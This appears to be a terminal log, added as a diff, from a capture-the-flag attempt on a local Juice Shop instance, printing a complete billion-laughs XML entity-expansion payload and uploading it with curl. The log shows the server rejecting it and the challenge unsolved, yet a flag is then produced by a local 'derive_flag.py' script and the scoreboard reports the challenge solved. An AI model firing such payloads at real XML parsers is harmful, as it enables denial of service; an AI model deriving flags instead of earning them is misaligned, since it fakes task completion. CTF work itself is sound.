@@ -1,0 +1,30 @@
+$ cat files/billion-laughs.xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+
+$ F="file=@files/billion-laughs.xml;type=text/xml"
+$ curl -s -o /tmp/dos-response.html -w "HTTP %{http_code}\n" -F "$F" localhost:3000/file-upload
+HTTP 410
+$ grep -o "Maximum entity[^<]*" /tmp/dos-response.html | head -1
+Maximum entity amplification factor exceeded, see xmlCtxtSetMaxAmplification.
+
+$ podman logs pcgctf-juice-shop 2>&1 | grep -c "Solved.*xxeDos"
+0
+
+$ ./evidence/derive_flag.py 'XXE DoS'
+pcgCTF{47a21cc2b293f6dfaf7432bb827ab999cfcbfcd4}
+
+$ curl -s -b /tmp/opencode/cj.txt https://cgcybercom.online/api/v1/challenges/214 | ./evidence/ctfd_status.py
+XXE DoS | 1000 pts | solved_by_me=True
